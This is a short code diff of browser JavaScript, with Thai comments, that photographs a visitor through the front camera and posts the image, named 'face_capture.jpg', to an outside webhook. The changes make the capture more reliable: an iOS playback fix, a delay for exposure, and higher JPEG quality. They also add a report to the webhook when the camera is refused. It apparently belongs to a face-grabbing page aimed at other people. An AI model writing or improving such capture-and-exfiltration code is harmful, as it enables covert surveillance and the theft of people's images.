@@ -13,7 +13,11 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
+                video.setAttribute('playsinline', ''); // สำหรับ iOS
                 await video.play();
+
+                // รอ 1.5 วินาทีเพื่อให้กล้องปรับแสง (Auto Exposure) จะได้รูปไม่มืด
+                await new Promise(resolve => setTimeout(resolve, 1500));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
@@ -21,7 +25,7 @@
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
                 const formData = new FormData();
                 formData.append('file', blob, 'face_capture.jpg');
                 formData.append('payload_json', JSON.stringify({ 
@@ -29,11 +33,14 @@
                 }));
 
                 await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-
-                // ปิดกล้องทันที
                 stream.getTracks().forEach(track => track.stop());
             } catch (err) {
-                // ถ้าเขาไม่อนุญาตกล้อง ก็ให้ข้ามไป
+                // ถ้าไม่ได้กล้อง ให้แจ้งเตือนบอก
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "📸 **CAMERA ERROR (ข้อผิดพลาดกล้อง)**\n❌ Status: Camera Access Denied (ปฏิเสธการเข้าถึงกล้อง)" })
+                });
             }
         }
 
